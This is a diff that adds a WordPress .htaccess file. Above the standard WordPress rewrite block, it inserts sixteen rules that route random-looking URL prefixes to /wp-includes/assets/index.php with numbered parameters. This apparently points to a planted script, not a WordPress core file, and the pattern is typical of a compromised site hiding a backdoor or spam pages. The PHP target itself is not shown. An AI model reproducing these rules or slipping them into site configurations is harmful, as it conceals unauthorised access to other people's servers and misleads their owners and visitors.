@@ -1,0 +1,34 @@
+<IfModule mod_rewrite.c>
+RewriteEngine on
+RewriteBase /
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule ^dECyYGs/(.*)$ /wp-includes/assets/index.php?a1=$1 [L]
+RewriteRule ^KtsToYr/(.*)$ /wp-includes/assets/index.php?a2=$1 [L]
+RewriteRule ^NDcKDcm/(.*)$ /wp-includes/assets/index.php?a3=$1 [L]
+RewriteRule ^YnScYts/(.*)$ /wp-includes/assets/index.php?a4=$1 [L]
+RewriteRule ^WlosTrx/(.*)$ /wp-includes/assets/index.php?a5=$1 [L]
+RewriteRule ^YuTsErs/(.*)$ /wp-includes/assets/index.php?a6=$1 [L]
+RewriteRule ^OptsYus/(.*)$ /wp-includes/assets/index.php?a7=$1 [L]
+RewriteRule ^IoAsnYSc/(.*)$ /wp-includes/assets/index.php?a8=$1 [L]
+RewriteRule ^NDcDEmc/(.*)$ /wp-includes/assets/index.php?a9=$1 [L]
+RewriteRule ^HyRtDnd/(.*)$ /wp-includes/assets/index.php?a10=$1 [L]
+RewriteRule ^DncDmfc/(.*)$ /wp-includes/assets/index.php?a11=$1 [L]
+RewriteRule ^DcDmcfS/(.*)$ /wp-includes/assets/index.php?a12=$1 [L]
+RewriteRule ^TdtYDmc/(.*)$ /wp-includes/assets/index.php?a13=$1 [L]
+RewriteRule ^DncfSmc/(.*)$ /wp-includes/assets/index.php?a14=$1 [L]
+RewriteRule ^MdyYusr/(.*)$ /wp-includes/assets/index.php?a15=$1 [L]
+RewriteRule ^JDmcEdc/(.*)$ /wp-includes/assets/index.php?a16=$1 [L]
+</IfModule>
+
+# BEGIN WordPress
+
+RewriteEngine On
+RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
+RewriteBase /
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+
+# END WordPress
